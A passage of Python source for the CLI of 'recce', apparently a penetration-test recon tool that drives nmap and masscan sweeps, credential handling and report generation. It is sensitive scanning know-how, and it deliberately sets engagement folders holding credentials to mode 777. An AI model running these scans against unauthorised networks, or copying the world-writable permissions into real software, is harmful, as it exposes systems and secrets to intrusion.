"""Command-line entrypoint for recce.

Subcommands (see `recce -h` for the full, authoritative list):
  Scan/enumerate  enum, scan, vulns, db, privesc, credenum, services
  Import/ingest   import (nmap -oX/-oG/-oN), ingest (on-target loot)
  Post-exploit    exploitplan, attackpath, creds, deploy (mass local-enum)
  Report/track    report, status, review, writeups, writeup
  Utility         demo (bundled sample, no network), doctor (self-test)
"""

from __future__ import annotations

import argparse
import copy
import json
import os
import re
import sys
import tempfile
import time
from concurrent.futures import CancelledError, ThreadPoolExecutor, as_completed

from . import ad
from . import exploits
from . import parser as np
from . import scanner
from . import tracking as tr
from .models import Host
from .report_excel import read_workbook_edits, update_workbook
from .report_markdown import build_csv, build_markdown
from .store import Store, StoreError
from .targets import expand_excludes, ip_matcher, load_targets

BANNER = r"""
  ____  _____ ____ ____ _____
 |  _ \| ____/ ___/ ___| ____|
 | |_) |  _|| |  | |   |  _|
 |  _ <| |__| |__| |___| |___
 |_| \_\_____\____\____|_____|
   recon & coverage tracker for airgapped pentests
"""

# Canonical severity ordering for sorting findings worst-first (shared by every
# finding-fold path: the deep-service commands and the AD/bloodhound merge).
_SEV_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}



def _fmt_dur(seconds: float) -> str:
    """Compact human duration: 45s / 3m20s / 1h04m."""
    s = int(round(seconds))
    if s < 60:
        return f"{s}s"
    if s < 3600:
        return f"{s // 60}m{s % 60:02d}s"
    return f"{s // 3600}h{(s % 3600) // 60:02d}m"


def _progress(done: int, total: int, start: float) -> str:
    """A '· 42% · ETA 3m20s' suffix from elapsed time and completion ratio."""
    if total <= 0:
        return ""
    pct = int(done * 100 / total)
    elapsed = time.monotonic() - start
    if done and done < total:
        eta = elapsed / done * (total - done)
        return f" · {pct}% · ETA {_fmt_dur(eta)}"
    if done >= total:
        return f" · 100% · {_fmt_dur(elapsed)} total"
    return f" · {pct}%"


def _summarize_failures(phase: str, errs: list, total: int) -> None:
    """Loud end-of-phase failure summary so a bad host can't scroll past unseen.
    `errs` is a list of (ip, message); prints nothing when everything went fine."""
    if not errs:
        print(f"[+] {phase}: {total}/{total} host(s) OK, no errors.")
        return
    hosts = len({ip for ip, _ in errs})
    print("\n" + "!" * 64)
    print(f"[x] {phase}: {hosts} host(s) had errors ({len(errs)} issue(s)) - "
          f"{total - hosts}/{total} clean:")
    for ip, msg in errs:
        print(f"      {ip:<16} {msg}")
    print("!" * 64)


def _ports_for_host(xml_path: str, ip: str) -> list[int]:
    for h in np.parse_nmap_xml(xml_path):
        if h.ip == ip:
            return [p.portid for p in h.ports]
    return []


def _swept_ports_for_host(xml_path: str, ip: str) -> list:
    """The Port objects the sweep found for this host (open ports only - the parser
    already drops closed/filtered). Unlike _ports_for_host (portids for the `-p`
    arg), this keeps the whole Port so the sweep's authoritative open-port result can
    be folded into the host: the enum re-scan enriches those ports with service/script
    data, but must never be able to DROP one it happened to miss (a heavier -sV/-sC
    pass with no congestion-adaptive retry can under-report on a lossy net or under
    host-timeout, which silently turned a host with real services into '0 open ports')."""
    for h in np.parse_nmap_xml(xml_path):
        if h.ip == ip:
            return list(h.ports)
    return []


def _fold_swept_ports(host, swept) -> None:
    """Union the sweep's open ports into `host`, keyed by (protocol, portid). The enum
    re-scan already populated host.ports with rich data, so an existing port wins; a
    swept port the enum missed is added back as a bare open port (svcdetect/reprobe
    fill in its service later). Guarantees the enum phase can only ADD to or enrich the
    authoritative sweep result, never erase it."""
    if not swept:
        return
    have = {(p.protocol, p.portid) for p in host.ports}
    for sp in swept:
        if (sp.protocol, sp.portid) not in have:
            host.ports.append(sp)


def _disproved_ports_in_xml(xml_path: str, ip: str) -> set:
    """Ports the enum re-scan ACTIVELY disproved for this host: nmap got a reply that
    proves the port is shut (a RST => 'closed'). Returns {(protocol, portid)}.

    parse_nmap_xml drops closed ports, so this reads the raw enum XML to recover
    nmap's negative verdicts. Used to prune masscan's stateless false positives: a
    masscan SYN-ACK that nmap then saw closed is dropped, but a port nmap merely
    couldn't reach ('filtered'/no-response = packet loss, NOT counted here) is kept -
    masscan's positive evidence stands over nmap loss. Never raises."""
    import xml.etree.ElementTree as ET
    try:
        tree = ET.parse(xml_path)
    except (OSError, ET.ParseError):
        return set()
    disproved: set = set()
    for hnode in tree.getroot().findall("host"):
        if ip not in [a.get("addr") for a in hnode.findall("address")]:
            continue
        ports_node = hnode.find("ports")
        if ports_node is None:
            continue
        for pnode in ports_node.findall("port"):
            st = pnode.find("state")
            # Only "closed" (a definitive RST) disproves. "filtered"/no-response is
            # ambiguous (firewall or loss) and must NOT prune a masscan-observed port.
            if st is not None and st.get("state", "") == "closed":
                try:
                    disproved.add((pnode.get("protocol", "tcp"),
                                   int(pnode.get("portid", "0"))))
                except (TypeError, ValueError):
                    continue
    return disproved


def _open_store(db_path: str):
    """Open the datastore, turning a corrupt/unreadable DB (StoreError) into a
    clean actionable message + None instead of a traceback. Used by the commands
    that open an existing engagement directly (report/status/writeups/...)."""
    try:
        return Store(db_path)
    except StoreError as e:
        print(f"[x] {e}")
        return None


def _relax_perms(path: str, mode: int = 0o777) -> None:
    """Best-effort chmod of the engagement tree to `mode` (default 777).

    recce is frequently run under sudo (raw socket scans, reading protected files),
    which leaves root-owned output a normal user can't reopen or edit afterward.
    We relax the whole output folder - every subdir and file - so the operator
    keeps full access regardless of how recce was invoked. Best-effort: a file
    owned by another user (that we can't chmod) is skipped, never fatal."""
    if not path or not os.path.isdir(path):
        return
    targets = [path]
    for root, dirs, files in os.walk(path):
        targets.extend(os.path.join(root, n) for n in dirs)
        targets.extend(os.path.join(root, n) for n in files)
    for t in targets:
        try:
            os.chmod(t, mode)
        except OSError:
            pass


def _open_paths(out_dir: str) -> dict[str, str]:
    raw = os.path.join(out_dir, "raw")
    os.makedirs(raw, exist_ok=True)
    # Keep the engagement folder world-accessible even when recce runs as root, so
    # the operator can always reopen/edit the outputs (see _relax_perms).
    try:
        os.chmod(out_dir, 0o777)
        os.chmod(raw, 0o777)
    except OSError:
        pass
    return {
        "raw": raw,
        "db": os.path.join(out_dir, "results.sqlite"),
        "xlsx": os.path.join(out_dir, "enumeration.xlsx"),
        "md": os.path.join(out_dir, "enumeration.md"),
        "csv": os.path.join(out_dir, "services.csv"),
        "html": os.path.join(out_dir, "report.html"),
        "assets": os.path.join(out_dir, "assets.html"),
        "log": os.path.join(out_dir, "recce.log"),
    }


def _now() -> str:
    return time.strftime("%Y-%m-%d %H:%M:%S")


def _record_issues(store: Store, paths: dict, ip: str, issues: list) -> None:
    """Persist scan issues (errors / incomplete scans) to the datastore + the
    plain-text run log, and echo errors to the console so they're seen live."""
    if not issues:
        return
    # Clear this host's prior issues for each phase we're about to (re)write, so a
    # re-run replaces its own issues instead of stacking duplicates.
    for phase in {iss.get("phase", "") for iss in issues if isinstance(iss, dict)}:
        store.clear_issues(ip, phase)
    for iss in issues:
        phase = iss.get("phase", "") if isinstance(iss, dict) else ""
        level = iss.get("level", "warning") if isinstance(iss, dict) else "warning"
        message = iss.get("message", "") if isinstance(iss, dict) else str(iss)
        store.add_issue(ip, phase, level, message, ts=_now())
        try:
            with open(paths["log"], "a") as fh:
                fh.write(f"{_now()} [{level.upper()}] {ip} {message}\n")
        except OSError:
            pass
        marker = "[!]" if level == "error" else "[~]"
        print(f"    {marker} {ip}: {message}")


def _persist_host(store: Store, paths: dict, ip: str, phase: str, host,
                  clear_step: str | None = None) -> bool:
    """Persist one host's results, isolating a datastore failure to that host so
    a single problematic host can never abort the rest of the phase (the store
    already retries locks via busy_timeout; this catches a lock that outlasts it
    or any serialization edge). Returns True if the host was stored."""
    try:
        store.upsert_host(host)
        if clear_step:
            store.delete_tracking(tr.step_key(clear_step, ip))  # re-run clears override
        return True
    except Exception as e:  # noqa: BLE001
        _record_issues(store, paths, ip,
                       [{"phase": phase, "level": "error",
                         "message": f"could not persist results: {e}"}])
        return False


def _resolve_domains(store: Store, hosts: list) -> list:
    domains = {d.name.lower(): d for d in ad.derive_domains(hosts)}
    for d in store.all_domains():
        key = d.name.lower()
        domains[key] = ad.merge_domain(domains[key], d) if key in domains else d
    return list(domains.values())


def _reconcile_steps(store: Store, step_edits: dict) -> None:
    """Turn Checklist step-checkbox values into overrides: record one only when it
    differs from the tool's current auto-completion; otherwise clear it so the box
    follows the tool. (This is what makes 'auto-default, manual wins' work.)"""
    for key, (shown, _note) in step_edits.items():
        try:
            _, step, ip = key.split(":", 2)
        except ValueError:
            continue
        host = store.get_host(ip)
        # A step that no longer applies to the host carries no override.
        if host and not tr.step_applies(host, step):
            store.delete_tracking(key)
            continue
        auto = tr.step_auto(host, step) if host else False
        if shown == auto:
            store.delete_tracking(key)     # follow the tool
        else:
            store.set_reviewed(key, shown)  # persist the manual override


def _import_excel_tracking(store: Store, paths: dict[str, str],
                           reconcile_steps: bool = True) -> None:
    """Pull operator checkbox/notes edits from the workbook into the datastore.

    The datastore is authoritative; call this BEFORE any mutation or regenerate so
    manual edits are captured but never clobbered by a stale rebuild. Step
    checkboxes are reconciled against tool auto-state only in operator-driven
    commands (`reconcile_steps=True`); mid-scan refreshes skip them, because the
    workbook can lag the tool's fresh progress and would look like manual edits."""
    if not os.path.exists(paths["xlsx"]):
        return
    edits, statuses = read_workbook_edits(paths["xlsx"])
    if not edits:
        return
    step_edits = {k: v for k, v in edits.items() if k.startswith("step:")}
    plain: dict = {}
    status_items: dict = {}
    for k, (rev, note) in edits.items():
        if k.startswith("step:"):
            continue
        if k in statuses:
            # Per-port tri-state: persist the status + derived reviewed + notes.
            status_items[k] = (statuses[k], rev, note)
        else:
            plain[k] = (rev, note)
    if plain:
        store.bulk_set_tracking(plain)
    if status_items:
        store.bulk_set_status(status_items)
    if reconcile_steps and step_edits:
        _reconcile_steps(store, step_edits)


def _safe_refresh(store: Store, paths: dict[str, str], title: str) -> bool:
    """Refresh reports mid-scan without losing operator edits.

    Re-imports the operator's saved checkboxes/notes from the workbook FIRST (so
    editing Excel while the scan runs is safe), then regenerates. If the workbook
    is open/locked and can't be written, leaves it and returns False - the edits
    are already captured in the datastore, so nothing is lost.
    """
    _import_excel_tracking(store, paths, reconcile_steps=False)
    try:
        _generate_reports(store, paths, title, quiet=True)
        return True
    except Exception:  # noqa: BLE001
        # A locked workbook (OSError) OR any report-builder bug must NOT abort the
        # scan phase mid-run - the data is safe in the datastore, and the final
        # report (or a later `report` command) will regenerate it.
        return False


# When `sweep` chains several deep-module commands, each one would otherwise
# regenerate the whole workbook on the way out (N rebuilds for N modules). This flag
# lets sweep suppress those intermediate rebuilds and regenerate exactly once at the
# end - the datastore is the source of truth, so nothing is lost by deferring.
_DEFER_REPORTS = False


def _generate_reports(store: Store, paths: dict[str, str], title: str,
                      quiet: bool = False) -> None:
    """Regenerate all reports from the datastore (the source of truth)."""
    if _DEFER_REPORTS:
        return
    hosts = store.all_hosts()
    from . import qod
    for h in hosts:                    # ensure every finding is QoD-scored before report/gates
        qod.annotate(h)
    # Optional noise floor: hide findings below the operator's QoD threshold from the
    # deliverables (set via `report --min-qod N`, persisted in meta; 0 = show all).
    try:
        min_qod = int(store.get_meta("min_qod") or 0)
    except (TypeError, ValueError):
        min_qod = 0
    if min_qod > 0:
        for h in hosts:
            h.vulns = [v for v in h.vulns if qod.qod_of(v) >= min_qod]
    tracking = store.get_tracking()
    domains = _resolve_domains(store, hosts)
    meta = {"subtitle": title}
    bh_blob = store.get_meta("ad_bloodhound")
    if bh_blob:
        try:
            meta["ad_bloodhound"] = json.loads(bh_blob)
        except ValueError:
            pass
    mssql_blob = store.get_meta("mssql")
    if mssql_blob:
        try:
            meta["mssql"] = json.loads(mssql_blob)
        except ValueError:
            pass
    smb_blob = store.get_meta("smb")
    if smb_blob:
        try:
            meta["smb"] = json.loads(smb_blob)
        except ValueError:
            pass
    ftp_blob = store.get_meta("ftp")
    if ftp_blob:
        try:
            meta["ftp"] = json.loads(ftp_blob)
        except ValueError:
            pass
    docker_blob = store.get_meta("docker")
    if docker_blob:
        try:
            meta["docker"] = json.loads(docker_blob)
        except ValueError:
            pass
    k8s_blob = store.get_meta("kubernetes")
    if k8s_blob:
        try:
            meta["kubernetes"] = json.loads(k8s_blob)
        except ValueError:
            pass
    ldap_blob = store.get_meta("ldap")
    if ldap_blob:
        try:
            meta["ldap"] = json.loads(ldap_blob)
        except ValueError:
            pass
    for _mk in ("snmp", "mongodb", "redis", "elasticsearch", "rsync", "nfs",
                "kerberos"):
        _blob = store.get_meta(_mk)
        if _blob:
            try:
                meta[_mk] = json.loads(_blob)
            except ValueError:
                pass
    credentials = store.all_credentials()   # one table scan, shared by both reports
    update_workbook(paths["xlsx"], hosts, meta=meta,
                    domains=domains, tracking=tracking, scope=store.get_scope(),
                    statuses=store.get_statuses(), issues=store.get_issues(),
                    credentials=credentials)
    build_markdown(hosts, paths["md"], title=title, domains=domains)
    build_csv(hosts, paths["csv"])
    from .report_html import build_html, build_assets_html
    gen = _now()
    build_html(hosts, paths["html"], title=title, domains=domains,
               credentials=credentials, generated=gen, tracking=tracking,
               assets_link=os.path.basename(paths["assets"]))
    build_assets_html(hosts, paths["assets"], title=title, domains=domains,
                      credentials=credentials, generated=gen,
                      ad_bloodhound=meta.get("ad_bloodhound"),
                      report_link=os.path.basename(paths["html"]))
    # Standalone, directly-viewable diagrams (open the .svg in any browser — no tools).
    # Best-effort - never block a report on these.
    try:
        from . import netmap
        eng_dir = os.path.dirname(paths["html"])
        ad_blob = meta.get("ad_bloodhound")

        def _write(name, text):
            with open(os.path.join(eng_dir, name), "w", encoding="utf-8") as fh:
                fh.write(text)

        def _standalone_svg(text):
            # the embedded copy omits xmlns; a file needs it to render on its own
            return text.replace("<svg ", '<svg xmlns="http://www.w3.org/2000/svg" ', 1)

        # Two directly-viewable SVG network maps (open in any browser, no tools):
        #   * FULL     - every host as its own card (the detailed map)
        #   * OVERVIEW - each subnet collapsed to per-role counts (readable at scale)
        _write("network-architecture.svg",
               _standalone_svg(netmap.architecture_svg(hosts, domains, ad_blob)))
        _write("network-map-full.svg",
               _standalone_svg(netmap.svg(hosts, domains, ad_blob, aggregate=False)))
        _write("network-map-overview.svg",
               _standalone_svg(netmap.svg(hosts, domains, ad_blob, aggregate=True)))
        _write("network-map-tiered.svg",
               _standalone_svg(netmap.tiered_svg(hosts, domains, ad_blob)))
        # Observed reachability — only when an on-target enum brought topology back.
        if any((h.topology or {}) for h in hosts):
            _write("network-reachability.svg",
                   _standalone_svg(netmap.reachability_svg(hosts, ad_blob)))
        # Attack path as a standalone SVG too (only when there's a confirmed path).
        from . import attackpath as _ap
        _ap_steps = _ap.build(hosts)
        if _ap_steps:
            _write("attack-path.svg", _standalone_svg(_ap.svg(hosts, _ap_steps)))
        # Standalone, directly-viewable AD tier-0 diagram (open the .svg in any
        # browser). It needs the xmlns the embedded copy omits to render as a file.
        arch = (meta.get("ad_bloodhound") or {}).get("architecture")
        if arch and arch.get("nodes"):
            svg = netmap.ad_svg(arch).replace(
                "<svg ", '<svg xmlns="http://www.w3.org/2000/svg" ', 1)
            with open(os.path.join(eng_dir, "ad-architecture.svg"), "w",
                      encoding="utf-8") as fh:
                fh.write(svg)
    except OSError:
        pass
    if not quiet:
        cov = tr.compute_coverage(hosts, tracking)["overall"]
        print(f"[+] Reports written ({cov['done']}/{cov['total']} items reviewed, "
              f"{cov['pct']}%):\n    {paths['xlsx']}\n    {paths['md']}\n    {paths['csv']}"
              f"\n    {paths['html']}\n    {paths['assets']} (architecture & assets)"
              f"\n    network map: network-architecture.svg (infra + segments) + "
              f"network-map-full.svg (every host) + "
              f"network-map-overview.svg (by role) + network-map-tiered.svg "
              f"(DC→servers→hosts) — open in any browser, no tools")
        counts = store.count_issues()
        if counts.get("total"):
            print(f"[!] {counts['total']} scan issue(s) logged "
                  f"({counts.get('error', 0)} error, {counts.get('warning', 0)} "
                  f"incomplete) - see the Overview tab or {paths['log']}")


# --- scan command ----------------------------------------------------------------

def _apply_profile_overrides(profile, args) -> None:
    g = lambda name, default=None: getattr(args, name, default)  # noqa: E731
    if g("all_ports"):
        profile.all_ports = True
    if g("top_ports"):
        profile.all_ports = False
        profile.top_ports = args.top_ports
    # --all-ports is the explicit, profile-overriding "full 65535-port sweep" and is
    # applied last so it wins over a quick profile or a lingering --top-ports.
    if g("all_ports"):
        profile.all_ports = True
    if g("no_ad"):
        profile.ad_enrich = False
    if g("no_os"):
        profile.os_detect = False
    if g("min_rate"):
        profile.min_rate = args.min_rate
    if g("max_retries") is not None:
        profile.max_retries = args.max_retries
    if g("no_verify"):
        profile.verify = False
    if g("verify_all"):
        profile.verify_all = True
    if g("no_udp_fallback"):
        profile.udp_fallback = False
    if g("reliable"):
        profile.reliable = True
    if g("udp_top"):
        profile.udp_top = args.udp_top
    if g("no_udp"):
        profile.udp_basic = False
    if g("masscan") or g("fast"):
        profile.scanner = "masscan"
    if g("offline"):
        profile.offline = True
    if g("host_timeout") is not None:
        profile.host_timeout = args.host_timeout
    if g("version_all"):
        profile.version_all = True
    if g("version_intensity") is not None:
        profile.version_intensity = args.version_intensity
    # An authoritative target list implies -Pn: every provided host is treated as up
    # (we pre-seed them), so discovery must not drop any as "down".
    if g("targets_up", False):
        profile.ping_discovery = False
    else:
        profile.ping_discovery = not g("no_discovery", False)
    profile.assume_up = not profile.ping_discovery   # -Pn: fail-fast on dead IPs
    if g("no_reconfirm", False):
        profile.reconfirm = False


def _split_userdomain(username: str, domain: str | None) -> tuple[str, str]:
    """Accept a domain-qualified username and split the domain out, so a tester can
    type the credential however AD hands it to them:
        -u 'CORP\\administrator'        -> user=administrator, domain=CORP
        -u 'corp.local/administrator'   -> user=administrator, domain=corp.local
        -u 'administrator@corp.local'   -> user=administrator, domain=corp.local
    An explicit -d always wins; an embedded domain only fills in when -d was
    omitted (so `-u CORP\\admin -d corp.local` keeps the fuller -d form)."""
    user = username or ""
    dom = domain or ""
    if "\\" in user:
        d, user = user.split("\\", 1)
        dom = dom or d
    elif "/" in user:
        d, user = user.split("/", 1)
        dom = dom or d
    elif "@" in user:
        user, d = user.rsplit("@", 1)
        dom = dom or d
    return user, dom


def _creds_of(args) -> dict | None:
    if not getattr(args, "username", None):
        return None
    user, domain = _split_userdomain(args.username, getattr(args, "domain", None))
    return {"username": user, "password": args.password, "domain": domain}


def _admin_creds_of(args) -> dict | None:
    """The optional privileged/superuser account (domain defaults to -d)."""
    if not getattr(args, "admin_username", None):
        return None
    user, domain = _split_userdomain(
        args.admin_username,
        getattr(args, "admin_domain", None) or getattr(args, "domain", None))
    return {"username": user, "password": args.admin_password, "domain": domain}


class _Refresher:
    """Throttled interim report refresh: regenerate after every N hosts OR at
    least every `interval` seconds, whichever comes first. Results are already
    persisted to SQLite per host, so this only controls how often the *sheet* is
    rebuilt - findings are durable even if a refresh is skipped or the run dies.
    """

    def __init__(self, args, interval: float = 20.0):
        self.every = getattr(args, "refresh_every", 0) or 0
        self.interval = interval
        self.count = 0
        self.last = time.monotonic()

    def tick(self, store, paths, title) -> None:
        self.count += 1
        now = time.monotonic()
        due = (self.every and self.count % self.every == 0) or \
              (now - self.last >= self.interval)
        if not due:
            return
        if _safe_refresh(store, paths, title):
            self.last = now
            print(f"    ~ report refreshed ({self.count} host(s) so far).")
        else:
            print("    ~ report open/locked - kept your edits, will retry.")


def _final_report(store, paths, title) -> None:
    """Always-try final report (guarded); results survive even if the file is
    locked, since they're in the datastore."""
    try:
        _import_excel_tracking(store, paths, reconcile_steps=False)
        _generate_reports(store, paths, title)
    except Exception as e:  # noqa: BLE001
        # Runs in every command's `finally`, so a locked workbook OR any
        # report-builder bug must not turn completed scan work into a crash.
        detail = "open/locked" if isinstance(e, OSError) else f"{type(e).__name__}: {e}"
        print(f"[!] Could not write the workbook ({detail}). Your data is saved "
              "in the datastore - close the file and run `report` to rebuild it.")


# --- phase 1+2a: discovery + light service enumeration --------------------------

def _mkissue(scan_issue, phase: str) -> dict:
    return {"phase": phase, "level": scan_issue.level,
            "message": scan_issue.message}


def _enum_worker(ip, profile, paths, creds, port_map, subnet_map, active_probe=True,
                 disc_reason="", provided_name=""):
    """Returns (host|None, issues)."""
    issues: list[dict] = []
    truncated = False
    # Proof-of-life reason for this host. Seeded with the discovery reply (echo-reply
    # /syn-ack/arp-response) when host discovery ran; a UDP fallback below can supply
    # one for a silent -Pn host. Empty stays empty -> the host build falls back to
    # "user-set" under -Pn, which is-NOT proof (keeps it off the confirmed-up list).
    up_reason = disc_reason
    # The nmap sweep (-sS/-sT --open) is authoritative: its open ports are folded into
    # the host after enum so the enum re-scan can enrich them but never drop one it
    # missed. The masscan `--fast` port_map is a stateless sweep that can false-positive,
    # so its ports are handled differently below: kept UNLESS the enum re-scan actively
    # disproved them (nmap saw the port closed), so real ports survive enum packet loss
    # while masscan's spurious opens are still pruned.
    swept_ports: list = []
    masscan_candidates: list = []
    if port_map is not None:
        open_ports = port_map.get(ip, [])
        masscan_candidates = list(open_ports)
    else:
        fp_xml = os.path.join(paths["raw"], f"{ip}_ports.xml")
        _, iss = scanner.full_port_scan(ip, fp_xml, profile)
        if iss:
            issues.append(_mkissue(iss, "port-sweep"))
            truncated = iss.kind == "host-timeout"
        open_ports = _ports_for_host(fp_xml, ip)
        swept_ports = _swept_ports_for_host(fp_xml, ip)
        # Completeness safeguard: a host that came back with ZERO ports may be
        # genuinely empty - or the fast pass dropped every probe. Confirm it with
        # an independent congestion-adaptive re-scan before we trust "no ports"
        # (everything downstream keys off this). Gated so dead -Pn IPs on a clean
        # network aren't all re-scanned: verify discovered-live hosts always, and
        # -Pn hosts only with --verify-all.
        if (not open_ports and profile.verify and not truncated
                and (profile.ping_discovery or profile.verify_all)):
            vx = os.path.join(paths["raw"], f"{ip}_verify.xml")
            _, viss = scanner.verify_port_scan(ip, vx, profile)
            vports = _ports_for_host(vx, ip)
            if viss and viss.kind == "host-timeout":
                truncated = True
            if vports:
                open_ports = vports
                swept_ports = _swept_ports_for_host(vx, ip)
                issues.append(_mkissue(scanner.ScanIssue(
                    "warning", f"port-sweep: fast pass found 0 ports but a "
                    f"verification re-scan found {len(vports)} - the first sweep "
                    "under-reported (network likely lossy); used the re-scan"),
                    "port-sweep"))
        # UDP fallback: still silent on TCP, no discovery reply, and we're treating
        # this IP as up on faith (-Pn / discovery blocked). A UDP ping to common
        # services tells up-behind-a-firewall apart from genuinely dead - so the host
        # is confirmed up on a real reply instead of being written off as down.
        if (not open_ports and not up_reason and not truncated
                and profile.udp_fallback and profile.assume_up):
            ulx = os.path.join(paths["raw"], f"{ip}_udpalive.xml")
            _, uiss = scanner.udp_liveness_probe(ip, ulx, profile)
            if uiss:                       # e.g. skipped (needs root) - surface it
                issues.append(_mkissue(uiss, "udp-liveness"))
            # np.parse_nmap_xml drops "down" hosts, so a host present here answered.
            alive = next((h for h in np.parse_nmap_xml(ulx) if h.ip == ip), None)
            if alive is not None:
                up_reason = alive.up_reason or "udp-response"
                issues.append(_mkissue(scanner.ScanIssue(
                    "warning", "udp-liveness: host answered a UDP probe "
                    f"({up_reason}) - confirmed UP despite 0 open TCP ports "
                    "(firewalled, not dead)"), "udp-liveness"))

    enum_xml = os.path.join(paths["raw"], f"{ip}_enum.xml")
    _, iss = scanner.enum_scan(ip, open_ports, enum_xml, profile, creds=creds)
    if iss:
        issues.append(_mkissue(iss, "enum"))
    host = _fold_host(ip, np.parse_nmap_xml(enum_xml), subnet_map)
    # The enum re-scan populated host.ports; fold the sweep's authoritative open ports
    # back in so a port the sweep definitively found is never lost when the heavier enum
    # pass under-reports (lossy network / host-timeout) - the root cause of a host with
    # real services being reported as "0 open ports".
    _fold_swept_ports(host, swept_ports)
    # masscan (--fast) path: masscan is stateless and can't be blindly trusted, so a
    # masscan-observed port is kept only if the enum re-scan didn't actively disprove it
    # (nmap saw it closed). This recovers ports enum lost to packet loss - the same "0
    # open ports" failure as the nmap path - while still pruning masscan's false opens.
    if masscan_candidates:
        from .models import Port
        disproved = _disproved_ports_in_xml(enum_xml, ip)
        have = {(p.protocol, p.portid) for p in host.ports}
        for pid in masscan_candidates:
            key = ("tcp", pid)
            if key in have or key in disproved:
                continue
            host.ports.append(Port(
                portid=pid, protocol="tcp", state="open", detect_source="masscan",
                reason="masscan-syn-ack (enum re-scan got no reply - kept, not confirmed)"))
    host.enumerated = True
    host.incomplete_scan = truncated
    # Record how we know this host is up: a real reply (discovery or UDP fallback)
    # when we have one, else "user-set" under -Pn (scanned on faith - not proof, so
    # a silent host stays UNKNOWN, never marked down). An open port speaks for itself.
    host.up_reason = up_reason or ("user-set" if profile.assume_up else host.up_reason)
    # An authoritative list supplies the hostname up front; keep it (nmap-resolved
    # names, if any, come first) so the host is labelled even when it answered nothing.
    if provided_name:
        host.hostnames = list(dict.fromkeys(host.hostnames + [provided_name]))
    # Basic UDP sweep: a TCP-only scan misses DNS/SNMP/NTP/IKE/TFTP/NetBIOS/... Fold any
    # open UDP services into the host. Runs in the per-host nmap path only (not the fast
    # masscan sweep, where UDP stays opt-in via --udp-top).
    if profile.udp_basic and port_map is None and not truncated:
        udp_xml = os.path.join(paths["raw"], f"{ip}_udp_basic.xml")
        _, uiss = scanner.udp_basic_scan(ip, udp_xml, profile)
        if uiss:
            issues.append(_mkissue(uiss, "udp-basic"))
        uhost = next((h for h in np.parse_nmap_xml(udp_xml) if h.ip == ip), None)
        if uhost is not None:
            have = {(p.protocol, p.portid) for p in host.ports}
            host.ports.extend(p for p in uhost.ports
                              if (p.protocol, p.portid) not in have)
    # Recover the services nmap left as unknown/blank: mine its kept fingerprint,
    # fall back to the curated port map, then a stdlib banner grab (active) - so a
    # port like 5040 becomes 'Windows CDPSvc', not a dead 'unknown'.
    from . import svcdetect
    svcdetect.enrich_host(host, active=active_probe)
    # Second opinion: for the handful of ports STILL unnamed, re-run nmap at max
    # version effort (--version-all) aimed at just those - cheap because it's a few
    # ports, and it's authoritative. Gated with the active probes (--no-probes).
    if active_probe:
        leftover = svcdetect.still_unknown_ports(host)
        if leftover:
            rp_xml = os.path.join(paths["raw"], f"{ip}_reprobe.xml")
            _, riss = scanner.reprobe_services(ip, leftover, rp_xml, profile)
            if riss:
                issues.append(_mkissue(riss, "reprobe"))
            svcdetect.apply_reprobe(host, np.parse_nmap_xml(rp_xml))
    ad.identify_roles(host)
    ad.parse_signing_and_ntlm(host)
    from . import vulndb
    vulndb.assess_host_inplace(host)   # offline version->CVE findings, immediately
    from . import qod
    qod.annotate(host)                 # stamp Quality-of-Detection once, from the method
    return host, issues


def _reconfirm_missed(missed, profile, paths):
    """Fast -Pn top-ports re-probe of hosts that missed the ping sweep. A host that
    answers on ANY port is definitively up, so this recovers firewalled-but-alive boxes
    before they're written off as down. Returns ({ip: up_reason}, issue|None)."""
    if not missed or not profile.reconfirm:
        return {}, None
    if len(missed) > profile.reconfirm_cap:
        print(f"    ({len(missed)} non-responders exceed the reconfirm cap "
              f"{profile.reconfirm_cap}; skipping the re-probe - re-run with -Pn or "
              "--fast to sweep them all.)")
        return {}, None
    with tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False) as tf:
        tf.write("\n".join(missed))
        tfile = tf.name
    rx = os.path.join(paths["raw"], "reconfirm.xml")
    print(f"[*] Reconfirming {len(missed)} non-responder(s) with a fast -Pn top-ports "
          "probe (catches firewalled-but-alive hosts) ...")
    _, iss = scanner.reconfirm_hosts(tfile, rx, profile)
    try:
        os.unlink(tfile)
    except OSError:
        pass
    recovered = {h.ip: (h.up_reason or "reconfirm: open port")
                 for h in np.parse_nmap_xml(rx) if h.open_ports}
    return recovered, iss


def _seed_targets(store, live_ips, subnet_map, hostname_map):
    """Pre-register every target as a known host BEFORE scanning, so a slow/timed-out/
    failed scan can never make a real target vanish from the report ('false no hosts').
    Each is stored up-front with its provided hostname and up_reason 'target-list'; the
    enum phase then enriches it in place. Returns the count seeded."""
    from .models import Host
    n = 0
    for ip in live_ips:
        h = Host(ip=ip, subnet=subnet_map.get(ip, ""), up_reason="target-list")
        name = hostname_map.get(ip)
        if name:
            h.hostnames = [name]
        store.upsert_host(h, merge=True)     # merge: never clobber an already-scanned host
        n += 1
    return n


def _discover(args, profile, store, paths):
    try:
        hosts, subnet_map, hostname_map = load_targets(args.targets)
    except (ValueError, OSError) as e:
        # Bad CIDR/range (ValueError) or a missing/unreadable @file (OSError) - the
        # literal first thing a tester types. Fail with a clear message, not a crash.
        print(f"[x] Invalid targets: {e}\n    Fix the IP / range / CIDR / @file "
              "and re-run.")
        return None, [], None, None, {}
    # Exclusions: expand this run's --exclude (IPs / ranges / CIDRs / @file), MERGE with
    # any persisted from a prior run, and persist the union - so once an IP is excluded
    # it stays out of scope on every later phase/re-run without re-typing it.
    try:
        run_excl = expand_excludes(args.exclude or [])
    except (ValueError, OSError) as e:
        print(f"[x] Invalid --exclude: {e}")
        return None, [], None, None, {}
    try:
        stored_excl = set(json.loads(store.get_meta("excludes") or "[]"))
    except (ValueError, TypeError):
        stored_excl = set()
    excluded = run_excl | stored_excl
    if excluded != stored_excl:
        store.set_meta("excludes", json.dumps(sorted(excluded)))
    before = len(hosts)
    hosts = [h for h in hosts if h not in excluded]
    if before != len(hosts):
        print(f"[+] Excluded {before - len(hosts)} host(s) from scope "
              f"({len(excluded)} IP(s) on the exclusion list).")
    if not hosts:
        print("[x] No targets after expansion/exclusion.")
        return None, [], None, None, {}
    # Record the full scope so the report accounts for every subnet, even those
    # that turn out to have no live hosts.
    sizes: dict[str, int] = {}
    for ip in hosts:
        sizes[subnet_map[ip]] = sizes.get(subnet_map[ip], 0) + 1
    for subnet, size in sizes.items():
        store.set_scope(subnet, size)
    print(f"[+] {len(hosts)} target host(s) across {len(sizes)} subnet(s).")

